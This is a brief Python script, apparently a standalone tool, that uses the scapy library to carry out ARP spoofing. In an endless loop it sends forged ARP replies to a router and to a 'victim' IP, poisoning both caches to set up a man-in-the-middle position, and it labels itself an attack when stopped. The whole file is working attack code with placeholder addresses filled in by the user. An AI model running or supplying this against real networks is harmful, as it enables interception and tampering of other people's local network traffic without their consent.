from scapy.all import ARP, send
from time import sleep

router_IP = "Enter the root IP"
victim_IP = "Enter the victim IP"

def spoofing(alvo_IP, fake_IP):
    PKT = ARP(op=2, pdst=alvo_IP, psrc=fake_IP)
    send(PKT, verbose=False)

try:
    while True:
        spoofing(router_IP, victim_IP)

        spoofing(victim_IP, router_IP)

        sleep(2)
except KeyboardInterrupt:
    print("Stopping the attack")